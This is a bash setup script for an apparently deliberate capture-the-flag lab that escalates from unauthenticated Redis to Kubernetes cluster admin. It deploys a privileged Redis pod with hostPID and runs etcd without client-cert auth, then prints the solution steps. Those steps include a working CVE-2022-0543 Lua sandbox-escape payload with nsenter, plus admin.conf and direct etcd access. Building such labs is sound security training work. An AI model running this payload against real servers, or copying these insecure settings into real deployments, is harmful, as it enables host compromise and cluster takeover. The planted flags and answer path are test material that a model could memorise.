#!/bin/bash
# Chain 16: Redis unauth → Lua sandbox RCE → node shell → RBAC → etcd (4 steps)
set -euo pipefail
K8S_ID="chain16"
CLUSTER_NAME="cve-chain16-redis-k8s"
source "$(dirname "$0")/../../scripts/k8s-common.sh"
FLAG1="flag{chain16-step1-redis}"
FLAG2="flag{chain16-step2-priv}"
FLAG3="flag{chain16-step3-rbac}"
FLAG4="flag{chain16-step4-etcd-final}"

echo "[Chain 16] Redis to K8s Cluster Admin — 4 steps"

mkdir -p /home/kianabin/cve-flags/chain16

kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraPortMappings:
      - containerPort: 30005
        hostPort: 10205
        protocol: TCP
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        etcd:
          local:
            extraArgs:
              client-cert-auth: "false"
KINDCFG

docker pull redis:6.2.6 2>/dev/null
kind load docker-image redis:6.2.6 --name "$CLUSTER_NAME" 2>/dev/null || true
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

# Vulnerable redis pod: no auth + privileged + hostPID (misconfig)
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Service
metadata:
  name: chain16-redis
  namespace: default
spec:
  selector:
    app: chain16-redis
  ports:
    - port: 6379
      targetPort: 6379
      nodePort: 30005
  type: NodePort
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: chain16-redis
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: chain16-redis
  template:
    metadata:
      labels:
        app: chain16-redis
    spec:
      hostPID: true
      containers:
        - name: redis
          image: redis:6.2.6
          imagePullPolicy: IfNotPresent
          command: ["redis-server", "--bind", "0.0.0.0", "--save", "", "--appendonly", "no"]
          securityContext:
            privileged: true
            runAsUser: 0
          ports:
            - containerPort: 6379
YAML

# Step 2 flag: node file (only reachable after RCE + nsenter)
NODE_CONTAINER=$(docker ps --filter "name=${CLUSTER_NAME}-control-plane" --format '{{.Names}}' 2>/dev/null || echo "")
if [ -n "$NODE_CONTAINER" ]; then
  docker exec "$NODE_CONTAINER" sh -c "echo '$FLAG2' > /etc/chain16-step2.txt" 2>/dev/null || true
fi

# Step 3 flag: kube-system secret (readable only from a node shell with admin.conf)
kubectl create secret generic chain16-step3 --from-literal=flag="$FLAG3" -n kube-system 2>/dev/null || true

# Step 4 final flag: custom etcd key (invisible to the Kubernetes API)
k8s_put_etcd_key "/chain16-final" "$FLAG4"

kubectl wait --for=condition=Ready pods -l app=chain16-redis --timeout=120s 2>/dev/null || true
sleep 5

# Seed step-1 flag into redis
kubectl exec deploy/chain16-redis -- redis-cli SET step1 "$FLAG1" 2>/dev/null || true

echo ""
echo "[Chain 16] Ready"
echo "  Entry: redis-cli -h localhost -p 10205"
echo "  Step 1: redis-cli -h localhost -p 10205 GET step1"
echo "  Step 2: CVE-2022-0543 Lua sandbox escape (redis:6.2.6) then nsenter --target 1 --mount -- cat /etc/chain16-step2.txt"
echo "    EVAL 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"nsenter --target 1 --mount --net -- sh -c 'cat /etc/chain16-step2.txt'\"); return f:read(\"*a\")' 0"
echo "  Step 3: from the node shell, install curl+kubectl and use /etc/kubernetes/admin.conf to read chain16-step3"
echo "  Step 4: node shell -> curl -k https://127.0.0.1:2379/v3/kv/range (key /chain16-final)"
